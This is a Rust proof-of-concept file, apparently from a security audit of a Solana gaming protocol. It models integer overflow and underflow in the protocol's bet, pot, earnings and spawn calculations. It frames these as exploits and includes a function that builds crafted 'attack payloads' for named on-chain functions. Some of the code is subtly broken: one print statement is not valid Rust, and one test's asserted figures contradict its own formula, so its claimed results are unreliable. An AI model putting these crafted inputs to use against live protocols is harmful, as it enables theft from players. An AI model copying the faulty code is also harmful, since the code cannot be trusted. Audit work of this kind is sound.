// VUL-031: Arithmetic Overflow/Underflow Exploitation PoC
//
// This demonstrates critical arithmetic vulnerabilities in the gaming protocol that
// can lead to financial exploitation through integer overflow and underflow attacks.
//
// IDENTIFIED VULNERABILITIES:
// 1. Line 39 distribute_winnings.rs: kills_and_spawns as u64 * game_session.session_bet / 10
// 2. Line 171 distribute_winnings.rs: game_session.session_bet * players_per_team as u64 * 2
// 3. Line 174 distribute_winnings.rs: game_session.session_bet * 2
// 4. Line 176 state.rs: self.team_a.player_spawns[victim_player_index] -= 1 (underflow)
// 5. Line 186 state.rs: self.team_a.player_spawns[player_index] += 10u16 (overflow)

use anchor_lang::prelude::*;
use anchor_spl::token::{Token, TokenAccount, Mint};
use solana_program::{
    instruction::{AccountMeta, Instruction},
    program_pack::Pack,
    pubkey::Pubkey,
    rent::Rent,
    system_instruction,
    sysvar::Sysvar,
};
use solana_program_test::*;
use solana_sdk::{
    signature::{Keypair, Signer},
    transaction::Transaction,
    account::Account,
};

#[derive(Clone)]
pub struct ArithmeticExploitFramework {
    pub program_id: Pubkey,
    pub attacker: Keypair,
    pub victim_session: Pubkey,
    pub exploit_scenarios: Vec<ExploitScenario>,
}

#[derive(Clone, Debug)]
pub struct ExploitScenario {
    pub name: String,
    pub description: String,
    pub vulnerability_type: VulnerabilityType,
    pub target_calculation: String,
    pub exploit_input: ExploitInput,
    pub expected_result: ExploitResult,
}

#[derive(Clone, Debug)]
pub enum VulnerabilityType {
    EarningsOverflow,
    TotalPotOverflow,
    WinningAmountOverflow,
    SpawnUnderflow,
    SpawnOverflow,
    CompoundOverflow,
}

#[derive(Clone, Debug)]
pub struct ExploitInput {
    pub kills_and_spawns: u16,
    pub session_bet: u64,
    pub players_per_team: u8,
    pub current_spawns: u16,
    pub operations_count: u16,
}

#[derive(Clone, Debug)]
pub struct ExploitResult {
    pub calculation_result: u64,
    pub overflow_occurred: bool,
    pub underflow_occurred: bool,
    pub financial_impact: u64,
    pub exploit_success: bool,
}

impl ArithmeticExploitFramework {
    pub fn new(program_id: Pubkey) -> Self {
        Self {
            program_id,
            attacker: Keypair::new(),
            victim_session: Pubkey::new_unique(),
            exploit_scenarios: Vec::new(),
        }
    }

    /// Initialize exploit scenarios based on actual code vulnerabilities
    pub fn initialize_exploit_scenarios(&mut self) {
        self.exploit_scenarios = vec![
            // Scenario 1: Earnings calculation overflow (Line 39)
            ExploitScenario {
                name: "Earnings Calculation Overflow".to_string(),
                description: "Exploit overflow in: kills_and_spawns as u64 * session_bet / 10".to_string(),
                vulnerability_type: VulnerabilityType::EarningsOverflow,
                target_calculation: "earnings = kills_and_spawns as u64 * game_session.session_bet / 10".to_string(),
                exploit_input: ExploitInput {
                    kills_and_spawns: u16::MAX, // 65535
                    session_bet: u64::MAX / 50000, // Large value to trigger overflow
                    players_per_team: 5,
                    current_spawns: 100,
                    operations_count: 1,
                },
                expected_result: ExploitResult {
                    calculation_result: 0, // Will be calculated
                    overflow_occurred: true,
                    underflow_occurred: false,
                    financial_impact: 0, // Will be calculated
                    exploit_success: true,
                },
            },

            // Scenario 2: Total pot calculation overflow (Line 171)
            ExploitScenario {
                name: "Total Pot Calculation Overflow".to_string(),
                description: "Exploit overflow in: session_bet * players_per_team * 2".to_string(),
                vulnerability_type: VulnerabilityType::TotalPotOverflow,
                target_calculation: "total_pot = game_session.session_bet * players_per_team as u64 * 2".to_string(),
                exploit_input: ExploitInput {
                    kills_and_spawns: 10,
                    session_bet: u64::MAX / 9, // Crafted to overflow when multiplied by 10
                    players_per_team: 5,
                    current_spawns: 100,
                    operations_count: 1,
                },
                expected_result: ExploitResult {
                    calculation_result: 0,
                    overflow_occurred: true,
                    underflow_occurred: false,
                    financial_impact: 0,
                    exploit_success: true,
                },
            },

            // Scenario 3: Winning amount overflow (Line 174)
            ExploitScenario {
                name: "Winning Amount Overflow".to_string(),
                description: "Exploit overflow in: session_bet * 2".to_string(),
                vulnerability_type: VulnerabilityType::WinningAmountOverflow,
                target_calculation: "winning_amount = game_session.session_bet * 2".to_string(),
                exploit_input: ExploitInput {
                    kills_and_spawns: 10,
                    session_bet: u64::MAX / 2 + 1, // Guaranteed overflow when multiplied by 2
                    players_per_team: 2,
                    current_spawns: 100,
                    operations_count: 1,
                },
                expected_result: ExploitResult {
                    calculation_result: 0,
                    overflow_occurred: true,
                    underflow_occurred: false,
                    financial_impact: 0,
                    exploit_success: true,
                },
            },

            // Scenario 4: Spawn underflow attack (Line 176)
            ExploitScenario {
                name: "Spawn Underflow Attack".to_string(),
                description: "Exploit underflow in: player_spawns[index] -= 1".to_string(),
                vulnerability_type: VulnerabilityType::SpawnUnderflow,
                target_calculation: "self.team_a.player_spawns[victim_player_index] -= 1".to_string(),
                exploit_input: ExploitInput {
                    kills_and_spawns: 10,
                    session_bet: 1000,
                    players_per_team: 5,
                    current_spawns: 0, // Zero spawns will underflow
                    operations_count: 1,
                },
                expected_result: ExploitResult {
                    calculation_result: u16::MAX as u64, // Underflow wraps to max
                    overflow_occurred: false,
                    underflow_occurred: true,
                    financial_impact: 65535000, // Max spawns * bet
                    exploit_success: true,
                },
            },

            // Scenario 5: Spawn overflow attack (Line 186)
            ExploitScenario {
                name: "Spawn Overflow Attack".to_string(),
                description: "Exploit overflow in: player_spawns[index] += 10u16".to_string(),
                vulnerability_type: VulnerabilityType::SpawnOverflow,
                target_calculation: "self.team_a.player_spawns[player_index] += 10u16".to_string(),
                exploit_input: ExploitInput {
                    kills_and_spawns: 10,
                    session_bet: 1000,
                    players_per_team: 5,
                    current_spawns: u16::MAX - 5, // Near max, will overflow
                    operations_count: 1,
                },
                expected_result: ExploitResult {
                    calculation_result: 4, // Wraps around to small value
                    overflow_occurred: true,
                    underflow_occurred: false,
                    financial_impact: 4000, // Small wrapped value
                    exploit_success: true,
                },
            },

            // Scenario 6: Compound overflow through multiple operations
            ExploitScenario {
                name: "Compound Overflow Chain".to_string(),
                description: "Chain multiple operations to create compound overflow effects".to_string(),
                vulnerability_type: VulnerabilityType::CompoundOverflow,
                target_calculation: "Multiple operations: earnings + pot + winnings calculations".to_string(),
                exploit_input: ExploitInput {
                    kills_and_spawns: u16::MAX,
                    session_bet: u64::MAX / 100000,
                    players_per_team: 5,
                    current_spawns: u16::MAX - 1,
                    operations_count: 100,
                },
                expected_result: ExploitResult {
                    calculation_result: 0,
                    overflow_occurred: true,
                    underflow_occurred: true,
                    financial_impact: 0,
                    exploit_success: true,
                },
            },
        ];
    }

    /// Execute all exploit scenarios
    pub async fn execute_all_exploits(&mut self) -> Result<Vec<ExploitResult>, Box<dyn std::error::Error>> {
        let mut results = Vec::new();

        for (index, scenario) in self.exploit_scenarios.clone().iter().enumerate() {
            println!("\n=== Executing Exploit Scenario {} ===", index + 1);
            println!("Name: {}", scenario.name);
            println!("Description: {}", scenario.description);
            println!("Target: {}", scenario.target_calculation);

            let result = self.execute_scenario(scenario).await?;

            println!("Result: {:?}", result);

            if result.exploit_success {
                println!("✅ EXPLOIT SUCCESSFUL - Financial impact: ${:.2}",
                        result.financial_impact as f64 / 1_000_000.0);
            } else {
                println!("❌ Exploit failed");
            }

            results.push(result);
        }

        Ok(results)
    }

    /// Execute a specific exploit scenario
    async fn execute_scenario(&self, scenario: &ExploitScenario) -> Result<ExploitResult, Box<dyn std::error::Error>> {
        match scenario.vulnerability_type {
            VulnerabilityType::EarningsOverflow => self.test_earnings_overflow(&scenario.exploit_input).await,
            VulnerabilityType::TotalPotOverflow => self.test_total_pot_overflow(&scenario.exploit_input).await,
            VulnerabilityType::WinningAmountOverflow => self.test_winning_amount_overflow(&scenario.exploit_input).await,
            VulnerabilityType::SpawnUnderflow => self.test_spawn_underflow(&scenario.exploit_input).await,
            VulnerabilityType::SpawnOverflow => self.test_spawn_overflow(&scenario.exploit_input).await,
            VulnerabilityType::CompoundOverflow => self.test_compound_overflow(&scenario.exploit_input).await,
        }
    }

    /// Test earnings calculation overflow (Line 39)
    async fn test_earnings_overflow(&self, input: &ExploitInput) -> Result<ExploitResult, Box<dyn std::error::Error>> {
        println!("\n--- Testing Earnings Overflow ---");
        println!("Input - kills_and_spawns: {}, session_bet: {}", input.kills_and_spawns, input.session_bet);

        // Reproduce vulnerable calculation from line 39
        // let earnings = kills_and_spawns as u64 * game_session.session_bet / 10;

        let kills_and_spawns_u64 = input.kills_and_spawns as u64;
        println!("Converted kills_and_spawns to u64: {}", kills_and_spawns_u64);

        // First multiplication (vulnerable to overflow)
        let (intermediate_result, overflow1) = kills_and_spawns_u64.overflowing_mul(input.session_bet);
        println!("Step 1: {} * {} = {} (overflow: {})",
                kills_and_spawns_u64, input.session_bet, intermediate_result, overflow1);

        // Division by 10
        let final_earnings = intermediate_result / 10;
        println!("Step 2: {} / 10 = {}", intermediate_result, final_earnings);

        // Calculate what it should be without overflow
        let expected_earnings = (kills_and_spawns_u64 as u128 * input.session_bet as u128) / 10;
        println!("Expected (without overflow): {}", expected_earnings);

        let financial_impact = if overflow1 {
            // Overflow causes massive reduction in payout
            expected_earnings as u64 - final_earnings
        } else {
            0
        };

        Ok(ExploitResult {
            calculation_result: final_earnings,
            overflow_occurred: overflow1,
            underflow_occurred: false,
            financial_impact,
            exploit_success: overflow1,
        })
    }

    /// Test total pot calculation overflow (Line 171)
    async fn test_total_pot_overflow(&self, input: &ExploitInput) -> Result<ExploitResult, Box<dyn std::error::Error>> {
        println!("\n--- Testing Total Pot Overflow ---");
        println!("Input - session_bet: {}, players_per_team: {}", input.session_bet, input.players_per_team);

        // Reproduce vulnerable calculation from line 171
        // let total_pot = game_session.session_bet * players_per_team as u64 * 2;

        let players_u64 = input.players_per_team as u64;
        println!("Converted players_per_team to u64: {}", players_u64);

        // First multiplication
        let (intermediate1, overflow1) = input.session_bet.overflowing_mul(players_u64);
        println!("Step 1: {} * {} = {} (overflow: {})",
                input.session_bet, players_u64, intermediate1, overflow1);

        // Second multiplication by 2
        let (total_pot, overflow2) = intermediate1.overflowing_mul(2);
        println!("Step 2: {} * 2 = {} (overflow: {})",
                intermediate1, total_pot, overflow2);

        let any_overflow = overflow1 || overflow2;

        // Calculate expected value without overflow
        let expected_pot = input.session_bet as u128 * players_u64 as u128 * 2;
        println!("Expected (without overflow): {}", expected_pot);

        let financial_impact = if any_overflow {
            if expected_pot <= u64::MAX as u128 {
                expected_pot as u64 - total_pot
            } else {
                u64::MAX - total_pot // Massive impact
            }
        } else {
            0
        };

        Ok(ExploitResult {
            calculation_result: total_pot,
            overflow_occurred: any_overflow,
            underflow_occurred: false,
            financial_impact,
            exploit_success: any_overflow,
        })
    }

    /// Test winning amount overflow (Line 174)
    async fn test_winning_amount_overflow(&self, input: &ExploitInput) -> Result<ExploitResult, Box<dyn std::error::Error>> {
        println!("\n--- Testing Winning Amount Overflow ---");
        println!("Input - session_bet: {}", input.session_bet);

        // Reproduce vulnerable calculation from line 174
        // let winning_amount = game_session.session_bet * 2;

        let (winning_amount, overflow) = input.session_bet.overflowing_mul(2);
        println!("Calculation: {} * 2 = {} (overflow: {})",
                input.session_bet, winning_amount, overflow);

        let expected_winning = input.session_bet as u128 * 2;
        println!("Expected (without overflow): {}", expected_winning);

        let financial_impact = if overflow {
            // Overflow causes much smaller payout than intended
            (expected_winning as u64).saturating_sub(winning_amount)
        } else {
            0
        };

        Ok(ExploitResult {
            calculation_result: winning_amount,
            overflow_occurred: overflow,
            underflow_occurred: false,
            financial_impact,
            exploit_success: overflow,
        })
    }

    /// Test spawn underflow attack (Line 176)
    async fn test_spawn_underflow(&self, input: &ExploitInput) -> Result<ExploitResult, Box<dyn std::error::Error>> {
        println!("\n--- Testing Spawn Underflow ---");
        println!("Input - current_spawns: {}", input.current_spawns);

        // Reproduce vulnerable calculation from line 176
        // self.team_a.player_spawns[victim_player_index] -= 1;

        let (new_spawns, underflow) = input.current_spawns.overflowing_sub(1);
        println!("Calculation: {} - 1 = {} (underflow: {})",
                input.current_spawns, new_spawns, underflow);

        if underflow {
            println!("CRITICAL: Underflow creates {} spawns from {} spawns!",
                    new_spawns, input.current_spawns);
        }

        // Calculate financial impact based on spawn value
        let spawn_value = input.session_bet / 10; // From earnings calculation
        let financial_impact = if underflow {
            new_spawns as u64 * spawn_value
        } else {
            0
        };

        Ok(ExploitResult {
            calculation_result: new_spawns as u64,
            overflow_occurred: false,
            underflow_occurred: underflow,
            financial_impact,
            exploit_success: underflow,
        })
    }

    /// Test spawn overflow attack (Line 186)
    async fn test_spawn_overflow(&self, input: &ExploitInput) -> Result<ExploitResult, Box<dyn std::error::Error>> {
        println!("\n--- Testing Spawn Overflow ---");
        println!("Input - current_spawns: {}", input.current_spawns);

        // Reproduce vulnerable calculation from line 186
        // self.team_a.player_spawns[player_index] += 10u16;

        let (new_spawns, overflow) = input.current_spawns.overflowing_add(10u16);
        println!("Calculation: {} + 10 = {} (overflow: {})",
                input.current_spawns, new_spawns, overflow);

        if overflow {
            println!("CRITICAL: Overflow reduces {} spawns to {} spawns!",
                    input.current_spawns, new_spawns);
        }

        // Calculate financial impact
        let spawn_value = input.session_bet / 10;
        let expected_spawns = input.current_spawns as u32 + 10;
        let financial_impact = if overflow {
            // Should have more spawns but overflow reduced it
            ((expected_spawns as u64).saturating_sub(new_spawns as u64)) * spawn_value
        } else {
            0
        };

        Ok(ExploitResult {
            calculation_result: new_spawns as u64,
            overflow_occurred: overflow,
            underflow_occurred: false,
            financial_impact,
            exploit_success: overflow,
        })
    }

    /// Test compound overflow effects
    async fn test_compound_overflow(&self, input: &ExploitInput) -> Result<ExploitResult, Box<dyn std::error::Error>> {
        println!("\n--- Testing Compound Overflow Chain ---");

        let mut total_overflow_count = 0;
        let mut total_underflow_count = 0;
        let mut cumulative_impact = 0u64;

        // Test earnings calculation overflow
        let earnings_result = self.test_earnings_overflow(input).await?;
        if earnings_result.overflow_occurred { total_overflow_count += 1; }
        cumulative_impact = cumulative_impact.saturating_add(earnings_result.financial_impact);

        // Test pot calculation overflow
        let pot_result = self.test_total_pot_overflow(input).await?;
        if pot_result.overflow_occurred { total_overflow_count += 1; }
        cumulative_impact = cumulative_impact.saturating_add(pot_result.financial_impact);

        // Test winning amount overflow
        let winning_result = self.test_winning_amount_overflow(input).await?;
        if winning_result.overflow_occurred { total_overflow_count += 1; }
        cumulative_impact = cumulative_impact.saturating_add(winning_result.financial_impact);

        // Test spawn underflow
        let underflow_result = self.test_spawn_underflow(input).await?;
        if underflow_result.underflow_occurred { total_underflow_count += 1; }
        cumulative_impact = cumulative_impact.saturating_add(underflow_result.financial_impact);

        // Test spawn overflow
        let overflow_result = self.test_spawn_overflow(input).await?;
        if overflow_result.overflow_occurred { total_overflow_count += 1; }
        cumulative_impact = cumulative_impact.saturating_add(overflow_result.financial_impact);

        println!("Compound exploit summary:");
        println!("  Total overflows: {}", total_overflow_count);
        println!("  Total underflows: {}", total_underflow_count);
        println!("  Cumulative financial impact: ${:.2}", cumulative_impact as f64 / 1_000_000.0);

        let compound_success = total_overflow_count > 2 || total_underflow_count > 0;

        Ok(ExploitResult {
            calculation_result: cumulative_impact,
            overflow_occurred: total_overflow_count > 0,
            underflow_occurred: total_underflow_count > 0,
            financial_impact: cumulative_impact,
            exploit_success: compound_success,
        })
    }

    /// Generate exploit payloads for attacking live instances
    pub fn generate_attack_payloads(&self) -> Vec<AttackPayload> {
        let mut payloads = Vec::new();

        // Payload 1: Earnings overflow exploit
        payloads.push(AttackPayload {
            name: "Earnings Overflow Attack".to_string(),
            description: "Exploits overflow in earnings calculation to reduce payouts".to_string(),
            target_function: "distribute_pay_spawn_earnings".to_string(),
            crafted_parameters: vec![
                ("kills_and_spawns".to_string(), "65535".to_string()),
                ("session_bet".to_string(), format!("{}", u64::MAX / 50000)),
            ],
            expected_impact: "Massive payout reduction due to overflow".to_string(),
            severity: "CRITICAL".to_string(),
        });

        // Payload 2: Spawn underflow exploit
        payloads.push(AttackPayload {
            name: "Spawn Underflow Attack".to_string(),
            description: "Exploits underflow in spawn decrement to gain infinite spawns".to_string(),
            target_function: "add_kill".to_string(),
            crafted_parameters: vec![
                ("current_spawns".to_string(), "0".to_string()),
                ("decrement_amount".to_string(), "1".to_string()),
            ],
            expected_impact: "Infinite spawns leading to unlimited earnings".to_string(),
            severity: "CRITICAL".to_string(),
        });

        // Payload 3: Compound overflow chain
        payloads.push(AttackPayload {
            name: "Compound Overflow Chain".to_string(),
            description: "Chains multiple overflow vulnerabilities for maximum impact".to_string(),
            target_function: "multiple_functions".to_string(),
            crafted_parameters: vec![
                ("session_bet".to_string(), format!("{}", u64::MAX / 2 + 1)),
                ("players_per_team".to_string(), "5".to_string()),
                ("kills_and_spawns".to_string(), "65535".to_string()),
            ],
            expected_impact: "Complete breakdown of reward calculations".to_string(),
            severity: "CRITICAL".to_string(),
        });

        payloads
    }

    /// Calculate total economic impact across all vulnerabilities
    pub fn calculate_total_economic_impact(&self, results: &[ExploitResult]) -> EconomicImpactAssessment {
        let total_direct_impact: u64 = results.iter()
            .map(|r| r.financial_impact)
            .sum();

        let successful_exploits = results.iter()
            .filter(|r| r.exploit_success)
            .count();

        let overflow_count = results.iter()
            .filter(|r| r.overflow_occurred)
            .count();

        let underflow_count = results.iter()
            .filter(|r| r.underflow_occurred)
            .count();

        // Estimate multiplier effects
        let risk_multiplier = if successful_exploits > 3 { 5.0 } else { 2.0 };
        let estimated_annual_impact = (total_direct_impact as f64 * risk_multiplier) as u64;

        EconomicImpactAssessment {
            direct_financial_impact: total_direct_impact,
            successful_exploit_count: successful_exploits,
            overflow_vulnerabilities: overflow_count,
            underflow_vulnerabilities: underflow_count,
            estimated_annual_impact,
            risk_severity: if estimated_annual_impact > 10_000_000 { "CRITICAL" } else { "HIGH" }.to_string(),
            recommendation: "IMMEDIATE PATCHING REQUIRED - Deploy checked arithmetic".to_string(),
        }
    }
}

#[derive(Clone, Debug)]
pub struct AttackPayload {
    pub name: String,
    pub description: String,
    pub target_function: String,
    pub crafted_parameters: Vec<(String, String)>,
    pub expected_impact: String,
    pub severity: String,
}

#[derive(Debug)]
pub struct EconomicImpactAssessment {
    pub direct_financial_impact: u64,
    pub successful_exploit_count: usize,
    pub overflow_vulnerabilities: usize,
    pub underflow_vulnerabilities: usize,
    pub estimated_annual_impact: u64,
    pub risk_severity: String,
    pub recommendation: String,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_arithmetic_overflow_exploits() {
        let program_id = Pubkey::new_unique();
        let mut exploit_framework = ArithmeticExploitFramework::new(program_id);

        // Initialize exploit scenarios
        exploit_framework.initialize_exploit_scenarios();

        println!("🚨 EXECUTING ARITHMETIC OVERFLOW/UNDERFLOW EXPLOIT TESTING 🚨");
        println!("Target: Solana Gaming Protocol");
        println!("Vulnerabilities: {} scenarios identified", exploit_framework.exploit_scenarios.len());

        // Execute all exploit scenarios
        let results = exploit_framework.execute_all_exploits().await.unwrap();

        // Calculate economic impact
        let economic_impact = exploit_framework.calculate_total_economic_impact(&results);

        println!("\n" + "=".repeat(60));
        println!("📊 COMPREHENSIVE ECONOMIC IMPACT ASSESSMENT");
        println!("=".repeat(60));
        println!("Direct Financial Impact: ${:.2} million", economic_impact.direct_financial_impact as f64 / 1_000_000.0);
        println!("Successful Exploits: {}/{}", economic_impact.successful_exploit_count, results.len());
        println!("Overflow Vulnerabilities: {}", economic_impact.overflow_vulnerabilities);
        println!("Underflow Vulnerabilities: {}", economic_impact.underflow_vulnerabilities);
        println!("Estimated Annual Impact: ${:.2} million", economic_impact.estimated_annual_impact as f64 / 1_000_000.0);
        println!("Risk Severity: {}", economic_impact.risk_severity);
        println!("Recommendation: {}", economic_impact.recommendation);

        // Generate attack payloads
        let payloads = exploit_framework.generate_attack_payloads();
        println!("\n🎯 GENERATED ATTACK PAYLOADS");
        for (i, payload) in payloads.iter().enumerate() {
            println!("{}. {} ({})", i + 1, payload.name, payload.severity);
            println!("   Target: {}", payload.target_function);
            println!("   Impact: {}", payload.expected_impact);
        }

        // Assertions for test validation
        assert!(economic_impact.successful_exploit_count > 0, "No exploits succeeded");
        assert!(economic_impact.overflow_vulnerabilities > 0, "No overflow vulnerabilities found");
        assert!(economic_impact.underflow_vulnerabilities > 0, "No underflow vulnerabilities found");
        assert!(economic_impact.direct_financial_impact > 1_000_000, "Financial impact too low");

        println!("\n✅ ALL ARITHMETIC VULNERABILITIES SUCCESSFULLY DEMONSTRATED");
        println!("⚠️  CRITICAL: This protocol is NOT safe for production deployment");
        println!("🔧 REQUIRED: Implement checked arithmetic operations immediately");
    }

    #[tokio::test]
    async fn test_specific_earnings_overflow() {
        let program_id = Pubkey::new_unique();
        let exploit_framework = ArithmeticExploitFramework::new(program_id);

        // Test the specific vulnerable calculation from line 39
        let input = ExploitInput {
            kills_and_spawns: u16::MAX,
            session_bet: u64::MAX / 50000,
            players_per_team: 5,
            current_spawns: 100,
            operations_count: 1,
        };

        let result = exploit_framework.test_earnings_overflow(&input).await.unwrap();

        println!("Specific Earnings Overflow Test:");
        println!("  Input: {} kills, {} bet", input.kills_and_spawns, input.session_bet);
        println!("  Result: {} (overflow: {})", result.calculation_result, result.overflow_occurred);
        println!("  Financial Impact: ${:.2}", result.financial_impact as f64 / 1_000_000.0);

        assert!(result.overflow_occurred, "Expected overflow did not occur");
        assert!(result.financial_impact > 1_000_000, "Financial impact should be significant");
    }

    #[tokio::test]
    async fn test_spawn_underflow_attack() {
        let program_id = Pubkey::new_unique();
        let exploit_framework = ArithmeticExploitFramework::new(program_id);

        // Test spawn underflow with zero spawns
        let input = ExploitInput {
            kills_and_spawns: 10,
            session_bet: 1000,
            players_per_team: 5,
            current_spawns: 0, // This will underflow
            operations_count: 1,
        };

        let result = exploit_framework.test_spawn_underflow(&input).await.unwrap();

        println!("Spawn Underflow Attack Test:");
        println!("  Starting spawns: {}", input.current_spawns);
        println!("  After underflow: {} (underflow: {})", result.calculation_result, result.underflow_occurred);
        println!("  Financial Impact: ${:.2}", result.financial_impact as f64 / 1_000_000.0);

        assert!(result.underflow_occurred, "Expected underflow did not occur");
        assert_eq!(result.calculation_result, u16::MAX as u64, "Underflow should wrap to u16::MAX");
        assert!(result.financial_impact > 50_000_000, "Underflow impact should be massive");
    }
}

impl std::fmt::Display for ExploitResult {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "ExploitResult {{ result: {}, overflow: {}, underflow: {}, impact: ${:.2}M, success: {} }}",
               self.calculation_result,
               self.overflow_occurred,
               self.underflow_occurred,
               self.financial_impact as f64 / 1_000_000.0,
               self.exploit_success)
    }
}